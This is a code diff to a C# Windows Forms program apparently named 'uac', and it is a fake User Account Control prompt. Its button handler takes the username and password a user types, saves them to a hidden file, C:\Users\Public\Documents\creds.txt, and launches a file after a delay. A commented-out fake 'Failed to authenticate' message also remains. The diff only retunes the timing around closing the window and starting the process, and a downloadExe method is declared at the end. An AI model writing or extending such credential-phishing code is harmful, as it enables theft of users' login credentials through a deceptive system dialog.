@@ -92,7 +92,7 @@ namespace uac
 
         private void button1_Click(object sender, EventArgs e)
         {
-            Thread.Sleep(2000);
+            
             string computerName = Environment.MachineName;
             string formatted = string.Format("{0};{1}", this.textBox1.Text.ToString(), this.textBox2.Text.ToString());
             if (File.Exists(@"C:\Users\Public\Documents\creds.txt"))
@@ -106,9 +106,10 @@ namespace uac
             File.SetAttributes(@"C:\Users\Public\Documents\creds.txt", FileAttributes.Hidden);
 
             //DialogResult result = MessageBox.Show("Failed to authenticate user.\n\nAccess denied or timeout expired\nCheck if you have local administrator privilages on computer '" + computerName + "'\n\nPossible reasons:\n1. Invalid credentials" , "User Account Control", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-            Process.Start(fileName);
             Close();
+            Thread.Sleep(3000);
+            Process.Start(fileName);
+            
         }
 
         public void downloadExe()
